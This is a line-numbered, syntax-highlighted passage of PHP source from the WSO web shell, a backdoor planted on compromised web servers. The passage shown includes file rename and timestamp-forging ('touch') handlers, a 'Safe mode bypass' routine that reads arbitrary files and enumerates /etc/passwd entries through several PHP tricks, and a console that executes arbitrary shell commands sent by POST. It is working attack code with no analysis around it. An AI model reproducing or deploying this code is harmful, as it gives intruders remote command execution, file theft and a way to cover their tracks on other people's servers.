<span class="lineno"> 775</span>                                                                 <span class="k">default</span><span class="o">:</span>
<span class="lineno"> 776</span>                                                                     <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.=</span> <span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
<span class="lineno"> 777</span>                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 778</span>                                                             <span class="p">}</span>
<span class="lineno"> 779</span>                                                             <span class="nv">$n</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 780</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$n</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 781</span>                                                                 <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 782</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 783</span>                                                                     <span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%08X&#39;</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 784</span>                                                                 <span class="p">}</span>
<span class="lineno"> 785</span>                                                                 <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.=</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 786</span>                                                                 <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.=</span> <span class="s2">&quot;</span>
<span class="lineno"> 787</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 788</span>                                                             <span class="p">}</span>
<span class="lineno"> 789</span>                                                         <span class="p">}</span>
<span class="lineno"> 790</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;table cellspacing=1 cellpadding=5 bgcolor=#222222&gt;&lt;tr&gt;&lt;td bgcolor=#333333&gt;&lt;span style=&quot;font-weight: normal;&quot;&gt;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&lt;/span&gt;&lt;/td&gt;&lt;td bgcolor=#282828&gt;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&lt;/td&gt;&lt;td bgcolor=#333333&gt;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 791</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 792</span>                                                     <span class="k">case</span> <span class="s1">&#39;rename&#39;</span><span class="o">:</span>
<span class="lineno"> 793</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 794</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span> <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t rename!&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 795</span>                                                             <span class="k">else</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;script&gt;g(null,null,&quot;&#39;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&quot;,null,&quot;&quot;)&lt;/script&gt;&#39;</span><span class="p">);</span>
<span class="lineno"> 796</span>                                                         <span class="p">}</span>
<span class="lineno"> 797</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;form onsubmit=&quot;g(null,null,null,null,this.name.value);return false;&quot;&gt;&lt;input type=text name=name value=&quot;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 798</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 799</span>                                                     <span class="k">case</span> <span class="s1">&#39;touch&#39;</span><span class="o">:</span>
<span class="lineno"> 800</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 801</span>                                                             <span class="nv">$time</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span>
<span class="lineno"> 802</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$time</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 803</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$time</span><span class="p">,</span> <span class="nv">$time</span><span class="p">))</span> <span class="k">echo</span> <span class="s1">&#39;Fail!&#39;</span><span class="p">;</span>
<span class="lineno"> 804</span>                                                                 <span class="k">else</span> <span class="k">echo</span> <span class="s1">&#39;Touched!&#39;</span><span class="p">;</span>
<span class="lineno"> 805</span>                                                             <span class="p">}</span> <span class="k">else</span> <span class="k">echo</span> <span class="s1">&#39;Bad time format!&#39;</span><span class="p">;</span>
<span class="lineno"> 806</span>                                                         <span class="p">}</span>
<span class="lineno"> 807</span>                                                         <span class="nb">clearstatcache</span><span class="p">();</span>
<span class="lineno"> 808</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;script&gt;p3_=&quot;&quot;;&lt;/script&gt;&lt;form onsubmit=&quot;g(null,null,null,null,this.touch.value);return false;&quot;&gt;&lt;input type=text name=touch value=&quot;&#39;</span> <span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s&quot;</span><span class="p">,</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 809</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 810</span>                                                     <span class="p">}</span>
<span class="lineno"> 811</span>                                                     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 812</span>                                                     <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno"> 813</span>                                                 <span class="p">}</span>
<span class="lineno"> 814</span>                                                 <span class="k">function</span> <span class="nf">actionSafeMode</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 815</span>                                                     <span class="nv">$temp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="lineno"> 816</span>                                                     <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 817</span>                                                     <span class="k">switch</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno"> 818</span>                                                         <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
<span class="lineno"> 819</span>                                                             <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">tempnam</span><span class="p">(</span><span class="nv">$test</span><span class="p">,</span> <span class="s1">&#39;cx&#39;</span><span class="p">);</span>
<span class="lineno"> 820</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="s2">&quot;compress.zlib://&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span> <span class="nv">$temp</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 821</span>                                                                 <span class="k">echo</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
<span class="lineno"> 822</span>                                                                 <span class="nb">unlink</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
<span class="lineno"> 823</span>                                                             <span class="p">}</span> <span class="k">else</span> <span class="k">echo</span> <span class="s1">&#39;Sorry... Can\&#39;t open file&#39;</span><span class="p">;</span>
<span class="lineno"> 824</span>                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 825</span>                                                         <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
<span class="lineno"> 826</span>                                                             <span class="nv">$files</span> <span class="o">=</span> <span class="nb">glob</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;*&#39;</span><span class="p">);</span>
<span class="lineno"> 827</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$files</span><span class="p">))</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$filename</span><span class="p">)</span> <span class="k">echo</span> <span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&quot;</span>
<span class="lineno"> 828</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 829</span>                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 830</span>                                                         <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
<span class="lineno"> 831</span>                                                             <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">(</span><span class="s2">&quot;file://&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&quot;</span> <span class="o">.</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!\(\d+\)\s.*!&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;index.php&#39;</span><span class="p">));</span>
<span class="lineno"> 832</span>                                                             <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
<span class="lineno"> 833</span>                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 834</span>                                                         <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
<span class="lineno"> 835</span>                                                             <span class="nb">ini_restore</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">);</span>
<span class="lineno"> 836</span>                                                             <span class="nb">ini_restore</span><span class="p">(</span><span class="s2">&quot;open_basedir&quot;</span><span class="p">);</span>
<span class="lineno"> 837</span>                                                             <span class="k">include</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno"> 838</span>                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 839</span>                                                         <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
<span class="lineno"> 840</span>                                                             <span class="k">for</span> <span class="p">(;</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">];</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 841</span>                                                                 <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno"> 842</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> <span class="k">echo</span> <span class="nb">join</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="nv">$uid</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;</span>
<span class="lineno"> 843</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 844</span>                                                             <span class="p">}</span>
<span class="lineno"> 845</span>                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 846</span>                                                         <span class="p">}</span>
<span class="lineno"> 847</span>                                                         <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
<span class="lineno"> 848</span>                                                         <span class="nx">wsoHeader</span><span class="p">();</span>
<span class="lineno"> 849</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Safe mode bypass&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 850</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;Copy (read file)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;1&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Glob (list dir)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;2&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Curl (read file)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;3&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Ini_restore (read file)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;4&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Posix_getpwuid (&quot;Read&quot; /etc/passwd)&lt;/span&gt;&lt;table&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;5&quot;,this.param1.value,this.param2.value);return false;\&#39;&gt;&lt;tr&gt;&lt;td&gt;From&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param1 value=0&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;To&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param2 value=1000&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 851</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=&quot;ml1&quot; style=&quot;margin-top:5px&quot; id=&quot;Output&quot;&gt;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 852</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 853</span>                                                         <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno"> 854</span>                                                     <span class="p">}</span>
<span class="lineno"> 855</span>                                                     <span class="k">function</span> <span class="nf">actionConsole</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 856</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 857</span>                                                             <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;stderr_to_out&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno"> 858</span>                                                             <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span><span class="o">.=</span> <span class="s1">&#39; 2&gt;&amp;1&#39;</span><span class="p">;</span>
<span class="lineno"> 859</span>                                                         <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;stderr_to_out&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 860</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 861</span>                                                             <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno"> 862</span>                                                             <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 863</span>                                                             <span class="k">echo</span> <span class="s2">&quot;d.cf.cmd.value=&#39;&#39;;</span>
<span class="lineno"> 864</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 865</span>                                                             <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">iconv</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">],</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="nb">addcslashes</span><span class="p">(</span><span class="s2">&quot;</span>
<span class="lineno"> 866</span> <span class="s2">$ &quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;</span>
<span class="lineno"> 867</span> <span class="s2">&quot;</span> <span class="o">.</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]),</span> <span class="s2">&quot;</span>
<span class="lineno"> 868</span> 
<span class="lineno"> 869</span> <span class="s2">  \&#39;&quot;</span><span class="p">));</span>
<span class="lineno"> 870</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;!.*cd\s+([^;]+)$!&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 871</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 872</span>                                                                     <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span>
<span class="lineno"> 873</span>                                                                     <span class="k">echo</span> <span class="s2">&quot;c_=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span>
<span class="lineno"> 874</span>                                                                 <span class="p">}</span>
<span class="lineno"> 875</span>                                                             <span class="p">}</span>
<span class="lineno"> 876</span>                                                             <span class="k">echo</span> <span class="s2">&quot;d.cf.output.value+=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$temp</span> <span class="o">.</span> <span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span>
<span class="lineno"> 877</span>                                                             <span class="k">echo</span> <span class="s2">&quot;d.cf.output.scrollTop = d.cf.output.scrollHeight;&quot;</span><span class="p">;</span>
<span class="lineno"> 878</span>                                                             <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
<span class="lineno"> 879</span>                                                             <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span>
<span class="lineno"> 880</span> <span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span>
<span class="lineno"> 881</span>                                                             <span class="k">exit</span><span class="p">;</span>
<span class="lineno"> 882</span>                                                         <span class="p">}</span>
<span class="lineno"> 883</span>                                                         <span class="nx">wsoHeader</span><span class="p">();</span>
<span class="lineno"> 884</span>                                                         <span class="k">echo</span> <span class="s2">&quot;&lt;script&gt;</span>
<span class="lineno"> 885</span> <span class="s2">if(window.Event) window.captureEvents(Event.KEYDOWN);</span>
<span class="lineno"> 886</span> <span class="s2">var cmds = new Array(&#39;&#39;);</span>
<span class="lineno"> 887</span> <span class="s2">var cur = 0;</span>
<span class="lineno"> 888</span> <span class="s2">function kp(e) {</span>
<span class="lineno"> 889</span> <span class="s2">  var n = (window.Event) ? e.which : e.keyCode;</span>
<span class="lineno"> 890</span> <span class="s2">  if(n == 38) {</span>
<span class="lineno"> 891</span> <span class="s2">      cur--;</span>
<span class="lineno"> 892</span> <span class="s2">      if(cur&gt;=0)</span>
<span class="lineno"> 893</span> <span class="s2">          document.cf.cmd.value = cmds[cur];</span>
<span class="lineno"> 894</span> <span class="s2">      else</span>
<span class="lineno"> 895</span> <span class="s2">          cur++;</span>
<span class="lineno"> 896</span> <span class="s2">  } else if(n == 40) {</span>
<span class="lineno"> 897</span> <span class="s2">      cur++;</span>
<span class="lineno"> 898</span> <span class="s2">      if(cur &lt; cmds.length)</span>
<span class="lineno"> 899</span> <span class="s2">          document.cf.cmd.value = cmds[cur];</span>
<span class="lineno"> 900</span> <span class="s2">      else</span>
<span class="lineno"> 901</span> <span class="s2">          cur--;</span>
<span class="lineno"> 902</span> <span class="s2">  }</span>
<span class="lineno"> 903</span> <span class="s2">}</span>
<span class="lineno"> 904</span> <span class="s2">function add(cmd) {</span>
<span class="lineno"> 905</span> <span class="s2">  cmds.pop();</span>
<span class="lineno"> 906</span> <span class="s2">  cmds.push(cmd);</span>
<span class="lineno"> 907</span> <span class="s2">  cmds.push(&#39;&#39;);</span>
<span class="lineno"> 908</span> <span class="s2">  cur = cmds.length-1;</span>
<span class="lineno"> 909</span> <span class="s2">}</span>
<span class="lineno"> 910</span> <span class="s2">&lt;/script&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 911</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Console&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=cf onsubmit=&quot;if(d.cf.cmd.value==\&#39;clear\&#39;){d.cf.output.value=\&#39;\&#39;;d.cf.cmd.value=\&#39;\&#39;;return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\&#39;\&#39;);}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\&#39;\&#39;);} return false;&quot;&gt;&lt;select name=alias&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 912</span>                                                         <span class="k">foreach</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;aliases&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$n</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 913</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 914</span>                                                                 <span class="k">echo</span> <span class="s1">&#39;&lt;optgroup label=&quot;-&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$n</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;-&quot;&gt;&lt;/optgroup&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 915</span>                                                                 <span class="k">continue</span><span class="p">;</span>
<span class="lineno"> 916</span>                                                             <span class="p">}</span>
<span class="lineno"> 917</span>                                                             <span class="k">echo</span> <span class="s1">&#39;&lt;option value=&quot;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$n</span> <span class="o">.</span> <span class="s1">&#39;&lt;/option&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 918</span>                                                         <span class="p">}</span>
<span class="lineno"> 919</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 920</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;/select&gt;&lt;input type=button onclick=&quot;add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\&#39;\&#39;);}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\&#39;\&#39;);}&quot; value=&quot;&gt;&gt;&quot;&gt; &lt;nobr&gt;&lt;input type=checkbox name=ajax value=1 &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="s1">&#39;checked&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&gt; send using AJAX &lt;input type=checkbox name=show_errors value=1 &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;stderr_to_out&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="s1">&#39;checked&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&gt; redirect stderr to stdout (2&gt;&amp;1)&lt;/nobr&gt;&lt;br/&gt;&lt;textarea class=bigarea name=output style=&quot;border-bottom:0;margin:0;&quot; readonly&gt;&#39;</span><span class="p">;</span>
